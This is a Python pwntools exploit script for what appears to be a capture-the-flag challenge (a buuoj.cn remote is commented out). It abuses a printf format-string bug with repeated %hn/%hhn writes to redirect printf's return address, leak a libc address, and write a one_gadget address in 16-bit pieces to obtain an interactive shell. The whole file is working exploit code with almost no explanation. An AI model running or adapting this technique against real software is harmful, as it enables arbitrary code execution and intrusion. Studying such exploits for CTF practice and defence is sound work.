from pwn import *		
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './pwn'

elf = ELF(pwnfile)			
libc = ELF("./libc.so.6")

io = process(pwnfile)
#io=remote('node5.buuoj.cn',26335)
def debug():
	gdb.attach(io,"b *0x00401361\nb printf")
	pause()

io.recvline()
io.recvuntil("Gift addr: ")
stack_adr = int(io.recv(12).decode(),16)
value = (stack_adr) & 0xffff# - 0x20

buf = 0x4040a0


payload=b'%p'*6
payload+=b'%'+str(value+0x48-0x97).encode()+b'c%hn'
payload+=b'%'+str(0x10003f-((value-0x16-0x12))).encode()+b'c%47$hhn'
payload+=b'------------%17$p'
payload=payload.ljust(0x100,b'\x00')
io.sendafter("Please leave your message: ",payload)

io.recvuntil("------------")
libc_base = int(io.recv(14),16)-243-libc.sym['__libc_start_main']
og = [0xe3afe,0xe3b01,0xe3b04]
ogg = libc_base + og[1]

ogg_1 = ogg & 0xffff
ogg_2 = (ogg>>16) & 0xffff
ogg_3 = (ogg>>32) & 0xffff

value = (stack_adr-0x20) & 0xffff 	#	rbp-8-8

payload=b'%'+str(0x3f).encode()+b'c%47$hhn'		# printf的返回地址
payload+=b'%'+str((value)-0x3f).encode()+b'c%35$hn'	# 准备onegadget地址
payload=payload.ljust(0x100,b'\x00')
io.send(payload)

payload=b'%'+str(0x3f).encode()+b'c%47$hhn'		
payload+=b'%'+str((ogg_1)-0x3f).encode()+b'c%49$hn'	
payload=payload.ljust(0x100,b'\x00')
io.send(payload)

payload=b'%'+str(0x3f).encode()+b'c%47$hhn'		
payload+=b'%'+str((value+2)-0x3f).encode()+b'c%35$hn'	
payload=payload.ljust(0x100,b'\x00')
io.send(payload)

payload=b'%'+str(0x3f).encode()+b'c%47$hhn'		
payload+=b'%'+str((ogg_2)-0x3f).encode()+b'c%49$hn'	
payload=payload.ljust(0x100,b'\x00')
io.send(payload)

payload=b'%'+str(0x3f).encode()+b'c%47$hhn'		
payload+=b'%'+str((value+4)-0x3f).encode()+b'c%35$hn'	
payload=payload.ljust(0x100,b'\x00')
io.send(payload)

payload=b'%'+str(0x3f).encode()+b'c%47$hhn'		
payload+=b'%'+str((ogg_3)-0x3f).encode()+b'c%49$hn'	
payload=payload.ljust(0x100,b'\x00')
io.send(payload)
debug()
# ret
payload=b'%'+str(0x13D4).encode()+b'c%47$hn'		
payload=payload.ljust(0x100,b'\x00')
io.send(payload)

io.interactive()
